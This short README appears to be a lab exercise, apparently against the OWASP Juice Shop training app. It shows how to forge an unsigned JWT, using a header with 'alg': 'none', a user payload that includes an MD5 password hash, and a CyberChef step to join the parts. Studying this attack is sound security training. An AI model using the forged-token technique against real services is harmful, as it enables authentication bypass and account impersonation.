## Generate new JWT Token with NodeJS

```
$npm ci
$node gen_jwt.js
```


##  Generate new JWT Token

Header
```
{
  "typ": "JWT",
  "alg": "none"
}
```

Payload
```
{
  "status": "success",
  "data": {
    "id": 41,
    "username": "",
    "email": "demo",
    "password": "e10adc3949ba59abbe56e057f20f883e",
    "role": "customer",
    "deluxeToken": "",
    "lastLoginIp": "0.0.0.0",
    "profileImage": "/assets/public/images/uploads/default.svg",
    "totpSecret": "",
    "isActive": true,
    "createdAt": "2023-11-16 14:10:44.472 +00:00",
    "updatedAt": "2023-11-16 14:10:44.472 +00:00",
    "deletedAt": null
  },
  "iat": 1700143890
}
```

Generate token from [CyberChef](https://gchq.github.io/CyberChef/)
* REsult = Header.Payload.
